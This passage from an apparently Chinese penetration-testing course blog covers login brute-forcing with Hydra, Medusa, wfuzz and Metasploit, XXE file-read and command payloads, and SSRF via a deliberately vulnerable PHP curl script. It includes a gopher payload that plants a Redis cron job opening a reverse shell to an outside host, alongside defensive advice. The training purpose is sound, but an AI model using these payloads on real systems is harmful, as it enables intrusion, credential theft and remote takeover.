title="Burp Suite实现暴力破解"></a>Burp Suite实现暴力破解</h1><p>Intruder 攻击模式</p><h1 id="密码暴力破解的防御"><a href="#密码暴力破解的防御" class="headerlink" title="密码暴力破解的防御"></a>密码暴力破解的防御</h1><h2 id="暴力破解防御"><a href="#暴力破解防御" class="headerlink" title="暴力破解防御"></a>暴力破解防御</h2><ol><li>sleep </li><li>Token </li><li>限制尝试次数，锁定账户</li><li>二次验证</li><li>reCAPTCHA（IP验证）</li><li>行为识别</li><li>WAF</li><li>强制修改密码</li><li>取消密码登录</li></ol><h2 id="个人用户安全建议"><a href="#个人用户安全建议" class="headerlink" title="个人用户安全建议"></a>个人用户安全建议</h2><ol><li>使用复杂密码 </li><li>不同网站使用不同密码 </li><li>定期修改密码 </li><li>防止被钓鱼</li></ol><h1 id="其他暴力破解工具"><a href="#其他暴力破解工具" class="headerlink" title="其他暴力破解工具"></a>其他暴力破解工具</h1><h2 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h2><ol><li>猜参数 </li><li>暴破密码 </li><li>找出网站过滤的参数，比如SQL注入和XSS </li><li>目录扫描 </li><li>压力测试</li></ol><pre class="line-numbers language-none"><code class="language-none">wfuzz -z file,user -z file,pass -d "username=FUZZ&amp;password=FUZ2Z&amp;submit=login"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="http://192.168.142.1/pikachu/vul/burteforce/bf_form.php">http://192.168.142.1/pikachu/vul/burteforce/bf_form.php</a></p><h2 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h2><p><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></p><p>支持： </p><blockquote><p>Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP- POST, HTTP-PROXY,HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST,HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener,Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin,Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5,SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth,VNC and XMPP</p></blockquote><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>-R</td><td>恢复上次中断的会话</td></tr><tr><td>-I</td><td>忽略之前的会话文件</td></tr><tr><td>-S</td><td>SSL连接</td></tr><tr><td>-s</td><td>指定端口</td></tr><tr><td>-l</td><td>用户名字典,-L 来自文件</td></tr><tr><td>-p</td><td>密码字典，-P 来自文件</td></tr><tr><td>-x</td><td>密码生成</td></tr><tr><td>-y</td><td>禁用字符</td></tr><tr><td>-r</td><td>rainy mode</td></tr><tr><td>-e</td><td>循环测试用户名而不是密码</td></tr><tr><td>-C</td><td>当用户名和密码存储到一个文件时使用此参数。注 意，文件(字典)存储的格式必须为 “用户名:密码” 的格式。</td></tr><tr><td>-M</td><td>批量暴破</td></tr><tr><td>-o</td><td>输出的文件名</td></tr><tr><td>-b</td><td>输出格式</td></tr><tr><td>-f</td><td>一旦爆破成功一个就停止爆破</td></tr><tr><td>-t</td><td>指定爆破时的任务数量(可以理解为线程数)，默认 为16</td></tr><tr><td>-T</td><td>总并发数</td></tr><tr><td>-w</td><td>每个线程的连接之间的响应等待时间</td></tr><tr><td>-c</td><td>所有线程单次登录等待时间</td></tr><tr><td>-4/-6</td><td>使用IPv4 / IPv6地址</td></tr><tr><td>-v</td><td>显示爆破的详细信息</td></tr><tr><td>-O</td><td>使用旧的SSL v2或v3版本</td></tr><tr><td>-q</td><td>不打印有关连接错误的消息</td></tr><tr><td>-U</td><td>服务模块使用详细信息</td></tr></tbody></table><h3 id="Hydra-Examples"><a href="#Hydra-Examples" class="headerlink" title="Hydra-Examples"></a>Hydra-Examples</h3><pre class="line-numbers language-none"><code class="language-none">hydra -l user -P passlist.txt ftp://192.168.0.1hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAINhydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5hydra -l admin -p password ftp://[192.168.0.0/24]/hydra -L logins.txt -P pws.txt -M targets<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h2><p><a href="http://foofus.net/goons/jmk/medusa/medusa.html">http://foofus.net/goons/jmk/medusa/medusa.html</a></p><p>支持AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP (NetWare),NNTP, PcAnywhere, POP3, PostgreSQL, rexec, rlogin, rsh, SMB, SMTP(AUTH/VRFY), SNMP, SSHv2, SVN, Telnet, VmAuthd, VN</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>-e</td><td>额外的密码检测(n：空密码 s：用户名=密码)</td></tr><tr><td>-M</td><td>指定执行的模块(不带.mod扩展名)</td></tr><tr><td>-m</td><td>指定传递给模块的参数</td></tr><tr><td>-d</td><td>查看支持破解的模块</td></tr><tr><td>-n</td><td>指定非默认的TCP端口</td></tr><tr><td>-s</td><td>启动SSL</td></tr><tr><td>-g</td><td>设置连接超时时间(默认值3)</td></tr><tr><td>-r</td><td>设置重试的次数(默认值3)</td></tr><tr><td>-R</td><td>重试次数</td></tr><tr><td>-c</td><td>验证socket连接是否可用的等待时间</td></tr><tr><td>-t</td><td>设置同时测试的登录总数</td></tr><tr><td>-T</td><td>设置同时测试的主机总数</td></tr><tr><td>-L</td><td>一个线程使用一个用户名</td></tr><tr><td>-f</td><td>在破解得到第一个用户名或密码后停止扫描主机</td></tr><tr><td>-F</td><td>当在任何主机上破解得到第一个用户名或密码后停止扫描</td></tr><tr><td>-b</td><td>不显示软件启动时的版本信息</td></tr><tr><td>-q</td><td>显示模块的使用信息</td></tr><tr><td>-v</td><td>详细等级(0-6)</td></tr><tr><td>-w</td><td>错误调试等级(0-10)</td></tr><tr><td>-V</td><td>显示版本信息</td></tr><tr><td>-Z</td><td>恢复中止的扫描</td></tr></tbody></table><h2 id="msf辅助模块"><a href="#msf辅助模块" class="headerlink" title="msf辅助模块"></a>msf辅助模块</h2><pre class="line-numbers language-none"><code class="language-none">msfconsoleuse auxiliary/scanner/ssh/ssh_loginset RHOSTS 192.168.142.66set PASS_FILE /root/vuln/passset USER_FILE /root/vuln/userexploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/16xxe/xxe/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/16xxe/xxe/</url>
      
        <content type="html"><![CDATA[<h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>XML基础知识 </li><li>什么是XXE </li><li>XXE利用方式 </li><li>XXE防御</li></ol><h1 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage </p><p>可扩展标记语言</p><h2 id="XML用途"><a href="#XML用途" class="headerlink" title="XML用途"></a>XML用途</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p><img src="assets/image-20221125151509717.png" alt="image-20221125151509717"></p><h3 id="交换数据"><a href="#交换数据" class="headerlink" title="交换数据"></a>交换数据</h3><p><img src="assets/image-20221125151538936.png" alt="image-20221125151538936"></p><h2 id="XML内容"><a href="#XML内容" class="headerlink" title="XML内容"></a>XML内容</h2><p><img src="assets/image-20221125151603048.png" alt="image-20221125151603048"></p><h3 id="XML格式要求"><a href="#XML格式要求" class="headerlink" title="XML格式要求"></a>XML格式要求</h3><ul><li>XML文档必须有<strong>根元素</strong> </li><li>XML文档必须有<strong>关闭标签</strong></li><li>XML标签对<strong>大小写</strong>敏感 </li><li>XML元素必须被<strong>正确的嵌套</strong> </li><li>XML属性必须<strong>加引号</strong></li></ul><h3 id="XML格式校验"><a href="#XML格式校验" class="headerlink" title="XML格式校验"></a>XML格式校验</h3><p>DTD（Document Type Definition ） </p><p>文档类型定义</p><h3 id="DTD内容之元素"><a href="#DTD内容之元素" class="headerlink" title="DTD内容之元素"></a>DTD内容之元素</h3><p><img src="assets/image-20221125151800051.png" alt="image-20221125151800051"></p><p>元素 ：ELEMENT</p><h3 id="DTD内容之实体"><a href="#DTD内容之实体" class="headerlink" title="DTD内容之实体"></a>DTD内容之实体</h3><p><img src="assets/image-20221125151825720.png" alt="image-20221125151825720"></p><p>实体 ：ENTITY</p><h3 id="实体ENTITY的使用"><a href="#实体ENTITY的使用" class="headerlink" title="实体ENTITY的使用"></a>实体ENTITY的使用</h3><p><img src="assets/image-20221125151901913.png" alt="image-20221125151901913"></p><p>内部实体 </p><p>INTERNAL [ɪnˈtɜːnl] ENTI</p><h3 id="外部实体ENTITY的使用"><a href="#外部实体ENTITY的使用" class="headerlink" title="外部实体ENTITY的使用"></a>外部实体ENTITY的使用</h3><p><img src="assets/image-20221125155403447.png" alt="image-20221125155403447"></p><h3 id="外部实体引用：协议"><a href="#外部实体引用：协议" class="headerlink" title="外部实体引用：协议"></a>外部实体引用：协议</h3><table><thead><tr><th>协议</th><th>使用方式</th></tr></thead><tbody><tr><td>file</td><td>file:///etc//passwd</td></tr><tr><td>php</td><td>php://filter/read=convert.base64-encode/resource=index.php</td></tr><tr><td>http</td><td>http//:wuya.com/evil.dtd</td></tr></tbody></table><h5 id="不同语言支持的协议"><a href="#不同语言支持的协议" class="headerlink" title="不同语言支持的协议"></a>不同语言支持的协议</h5><table><thead><tr><th>Libxml2</th><th>PHP</th><th>Java</th><th>.NET</th></tr></thead><tbody><tr><td>file http ftp</td><td>file http ftp php compress.zlib compress.bzip2 data glob phar</td><td>file http https ftp jar netdoc mailto gopher *</td><td>file http https ftp</td></tr></tbody></table><h5 id="PHP扩展"><a href="#PHP扩展" class="headerlink" title="PHP扩展"></a>PHP扩展</h5><table><thead><tr><th>Schema</th><th>Extension Required</th></tr></thead><tbody><tr><td>https ftps</td><td>openssl</td></tr><tr><td>zip</td><td>zip</td></tr><tr><td>ssh2.shell ssh2.exec ssh2.tunnel ssh2.sftp ssh2.scp</td><td>ssh2</td></tr><tr><td>rar</td><td>rar</td></tr><tr><td>ogg</td><td>oggvorbis</td></tr><tr><td>expect</td><td>expect</td></tr></tbody></table><h3 id="完整的XML内容"><a href="#完整的XML内容" class="headerlink" title="完整的XML内容"></a>完整的XML内容</h3><p><img src="assets/image-20221125165532725.png" alt="image-20221125165532725"></p><h1 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE"></a>什么是XXE</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p><img src="assets/image-20221125165741902.png" alt="image-20221125165741902"></p><p>XML外部实体注入 </p><p>XML External Entity Injection</p><h2 id="XXE定义"><a href="#XXE定义" class="headerlink" title="XXE定义"></a>XXE定义</h2><p>如果Web应用的脚本代码没有限制XML引入外部实体，</p><p>从而导致用户可以插入一个<strong>外部实体</strong>，</p><p>并且其中的内容会被服务器端执行，</p><p>插入的代码可能导致:</p><ul><li>任意文件读取、</li><li>系统命令执行、</li><li>内网端口探测、</li><li>攻击内网网站等危害。</li></ul><p>读取文件</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>login</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>login</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>探测端口</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span><span class="token delimiter important">?&gt;</span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span><span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY xxe SYSTEM "http://192.168.31.193:8092"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>login</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>login</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>执行命令</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "expect://ipconfig"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>login</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>login</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="XXE利用方式"><a href="#XXE利用方式" class="headerlink" title="XXE利用方式"></a>XXE利用方式</h1><h2 id="微信支付XXE漏洞"><a href="#微信支付XXE漏洞" class="headerlink" title="微信支付XXE漏洞"></a>微信支付XXE漏洞</h2><p><img src="assets/image-20221125175513874.png" alt="image-20221125175513874"></p><h2 id="微信支付XXE漏洞-1"><a href="#微信支付XXE漏洞-1" class="headerlink" title="微信支付XXE漏洞"></a>微信支付XXE漏洞</h2><p><img src="assets/image-20221125175530987.png" alt="image-20221125175530987"></p><h2 id="直打：xxe靶场"><a href="#直打：xxe靶场" class="headerlink" title="直打：xxe靶场"></a>直打：xxe靶场</h2><p>访问：<a href="http://192.168.31.193:8093/php_xxe/">http://192.168.31.193:8093/php_xxe/</a></p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><h4 id="确定使用XML传输数据（抓包可得）"><a href="#确定使用XML传输数据（抓包可得）" class="headerlink" title="确定使用XML传输数据（抓包可得）"></a>确定使用XML传输数据（抓包可得）</h4><p><img src="assets/image-20221125184636443.png" alt="image-20221125184636443"></p><p><img src="assets/image-20221125185102619.png" alt="image-20221125185102619"></p><h4 id="发送到Repeater"><a href="#发送到Repeater" class="headerlink" title="发送到Repeater"></a>发送到Repeater</h4><p><img src="assets/image-20221125190021144.png" alt="image-20221125190021144"></p><h4 id="添加DTD，引用外部问文档"><a href="#添加DTD，引用外部问文档" class="headerlink" title="添加DTD，引用外部问文档"></a>添加DTD，引用外部问文档</h4><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span>11  <span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>1  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Send得到响应"><a href="#Send得到响应" class="headerlink" title="Send得到响应"></a>Send得到响应</h4><p><img src="assets/image-20221125185444129.png" alt="image-20221125185444129"></p><p><img src="assets/image-20221125190115068.png" alt="image-20221125190115068"></p><h3 id="盲打-DNSLog"><a href="#盲打-DNSLog" class="headerlink" title="盲打-DNSLog"></a>盲打-DNSLog</h3><p><img src="assets/image-20221125191451126.png" alt="image-20221125191451126"></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % remote SYSTEM "http://test.bep1pi.dnslog.cn"&gt;%remote;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20221125191612095.png" alt="image-20221125191612095"></p><p><img src="assets/image-20221125191645864.png" alt="image-20221125191645864"></p><h3 id="盲打-http接口参数，写入文件"><a href="#盲打-http接口参数，写入文件" class="headerlink" title="盲打-http接口参数，写入文件"></a>盲打-http接口参数，写入文件</h3><p><img src="assets/image-20221125183019656.png" alt="image-20221125183019656"></p><h2 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h2><p><a href="http://192.168.70.130/vul/xxe/xxe_1.php">http://192.168.70.130/vul/xxe/xxe_1.php</a></p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0"?&gt;  &lt;!DOCTYPE foo [     &lt;!ENTITY xxe "哈哈" &gt; ]&gt;  &lt;foo&gt;&amp;xxe;&lt;/foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20221125194627357.png" alt="image-20221125194627357"></p><h1 id="XXE-防御"><a href="#XXE-防御" class="headerlink" title="XXE 防御"></a>XXE 防御</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>libxml_disable_entity_loader(true);</p><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>DocumentBuilderFactory dbf </p><p>=DocumentBuilderFactory.newInstance(); </p><p>dbf.setExpandEntityReferences(false);</p><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>from lxml import etree </p><p>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p><h2 id="过滤用户提交的XML数据"><a href="#过滤用户提交的XML数据" class="headerlink" title="过滤用户提交的XML数据"></a>过滤用户提交的XML数据</h2><p><code>'</code> </p><p><code>"</code> </p><p><code>''(two apostrophe)</code> </p><p><code>""</code> </p><p><code>&lt; &gt;</code></p><p> <code>]]&gt;</code> </p><p><code>]]&gt;&gt;</code> </p><p><code>&lt;!--/--&gt;</code></p><p><code>/--&gt;</code> </p><p><code>--&gt;</code></p><p><code>&lt;!--</code> </p><p><code>&lt;!</code><br><code>&lt;! [CDATA[/]]</code></p><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>以mod_security为例</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/15ssrf/ssrf/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/15ssrf/ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>SSRF是什么 </li><li>SSRF常见场景 </li><li>如何发现SSRF漏洞 </li><li>如何防御SSRF漏洞</li></ol><h1 id="SSRF是什么"><a href="#SSRF是什么" class="headerlink" title="SSRF是什么"></a>SSRF是什么</h1><h3 id="CURL"><a href="#CURL" class="headerlink" title="CURL"></a>CURL</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 设置URL和相应的选项</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 启用时会将头文件的信息作为数据流输出  </span>    <span class="token comment">// 抓取URL并把它传递给浏览器  </span>    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//关闭cURL资源，并且释放系统资源  </span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问百度：<a href="http://192.168.31.193:8091/ssrf1.php?url=www.baidu.com">http://192.168.31.193:8091/ssrf1.php?url=www.baidu.com</a></p><p>访问本地文件：<a href="http://192.168.31.193:8091/ssrf1.php?url=file:///c:/windows/win.ini">http://192.168.31.193:8091/ssrf1.php?url=file:///c:/windows/win.ini</a></p><h3 id="php的curl扩展"><a href="#php的curl扩展" class="headerlink" title="php的curl扩展"></a>php的curl扩展</h3><p>php.ini</p><p><code>extension=php_curl.dll</code></p><p>功能</p><p>获取网页资源——爬虫 </p><p>webservice——获取接口数据 </p><p>FTP——下载文件 </p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF (Server-Side Request Forgery) </p><p>服务器端请求伪造</p><h3 id="PHP其他函数"><a href="#PHP其他函数" class="headerlink" title="PHP其他函数"></a>PHP其他函数</h3><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>curl_exec()</td><td>执行cURL会话</td></tr><tr><td>file_get_contents()</td><td>将整个文件读入一个字符串</td></tr><tr><td>fsockopen()</td><td>打开一个网络连接或者一个Unix套 接字连接</td></tr></tbody></table><p>可能引起SSRF漏洞</p><h3 id="CURL其他协议"><a href="#CURL其他协议" class="headerlink" title="CURL其他协议"></a>CURL其他协议</h3><table><thead><tr><th>协议</th><th>作用</th><th>payload</th></tr></thead><tbody><tr><td>file</td><td>查看文件</td><td><code>curl -v 'file:///etc/password'</code></td></tr><tr><td>dict</td><td>探测端口</td><td><a href="http://192.168.31.193:8091/ssrf1.php?url=dict://192.168.31.193:3306">http://192.168.31.193:8091/ssrf1.php?url=dict://192.168.31.193:3306</a></td></tr><tr><td>gopher</td><td>反弹shell</td><td><code>curl -v 'gopher://192.168.31.193:8091/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d% 0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.142.135/4444 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3% 0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron /%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a $10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$ 4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'</code></td></tr></tbody></table><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><p> dict协议：用于搭建在线字典服务</p><p> gopher协议：是一种信息查找系统，只支持文本，不支持图像，已被HTTP替代</p><h2 id="SSRF定义"><a href="#SSRF定义" class="headerlink" title="SSRF定义"></a>SSRF定义</h2><p>SSRF Server-Side Request Forgery </p><p>服务器端请求伪造：是一种由攻击者构造形成由<strong>服务端</strong>发起请求的一个安全漏洞。</p><p><img src="assets/image-20221125133759679.png" alt="image-20221125133759679"></p><h2 id="危害（利用方式）"><a href="#危害（利用方式）" class="headerlink" title="危害（利用方式）"></a>危害（利用方式）</h2><ol><li>扫描资产 </li><li>获取敏感信息 </li><li>攻击内网服务器（绕过防火墙） </li><li>访问大文件，造成溢出 </li><li>通过Redis写入WebShell或建立反弹连接</li></ol><h1 id="SSRF常见场景"><a href="#SSRF常见场景" class="headerlink" title="SSRF常见场景"></a>SSRF常见场景</h1><h2 id="社会化分享功能"><a href="#社会化分享功能" class="headerlink" title="社会化分享功能"></a>社会化分享功能</h2><p><img src="assets/image-20221125140125984.png" alt="image-20221125140125984"></p><p><img src="assets/image-20221125140133352.png" alt="image-20221125140133352"></p><p>分享时，解析当前网页的标题等等</p><h2 id="转码服务"><a href="#转码服务" class="headerlink" title="转码服务"></a>转码服务</h2><p><img src="assets/image-20221125140410419.png" alt="image-20221125140410419"></p><h2 id="在线翻译"><a href="#在线翻译" class="headerlink" title="在线翻译"></a>在线翻译</h2><p><img src="assets/image-20221125140453736.png" alt="image-20221125140453736"></p><h2 id="图片加载、下载功能"><a href="#图片加载、下载功能" class="headerlink" title="图片加载、下载功能"></a>图片加载、下载功能</h2><p><img src="assets/image-20221125140537017.png" alt="image-20221125140537017"></p><h2 id="图片、文章收藏功能"><a href="#图片、文章收藏功能" class="headerlink" title="图片、文章收藏功能"></a>图片、文章收藏功能</h2><p><img src="assets/image-20221125140559729.png" alt="image-20221125140559729"></p><h2 id="网站采集、网站抓取"><a href="#网站采集、网站抓取" class="headerlink" title="网站采集、网站抓取"></a>网站采集、网站抓取</h2><p><img src="assets/image-20221125140646947.png" alt="image-20221125140646947"></p><h2 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a>实际案例</h2><ol><li>Wordpress 3.5.1以下版本 xmlrpc.php pingback的缺陷与SSFR </li><li>discuz!的SSRF（利用php的header函数来 绕过，其实就是302跳转实现协议转换） </li><li>weblogic的SSRF</li></ol><h1 id="如何发现SSRF漏洞"><a href="#如何发现SSRF漏洞" class="headerlink" title="如何发现SSRF漏洞"></a>如何发现SSRF漏洞</h1><ol><li>爬取地址 </li><li>查看是否请求了其他资源</li></ol><p>也可以用Google语法搜索关键字： </p><p>share、wap、url、link、src、source、target、u、 3g、display、sourceURL、imageURL、domain</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="SSRF-Testing"><a href="#SSRF-Testing" class="headerlink" title="SSRF-Testing"></a>SSRF-Testing</h3><p><a href="https://github.com/cujanovic/SSRF-Testing">https://github.com/cujanovic/SSRF-Testing</a> </p><h3 id="Gopherus"><a href="#Gopherus" class="headerlink" title="Gopherus"></a>Gopherus</h3><p><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><ol><li>MySQL (Port-3306)</li><li>PostgreSQL(Port-5432)</li><li>FastCGI (Port-9000)</li><li>Memcached (Port-11211)</li><li>Redis (Port-6379)</li><li>Zabbix (Port-10050)</li><li>SMTP (Port-25)</li></ol><h3 id="SSRFmap"><a href="#SSRFmap" class="headerlink" title="SSRFmap"></a>SSRFmap</h3><p><a href="https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a></p><p>安装</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/swisskyrepo/SSRFmapcd SSRFmap/pip3 install -r requirements.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用</p><pre class="line-numbers language-none"><code class="language-none">python3 ssrfmap.py  usage: 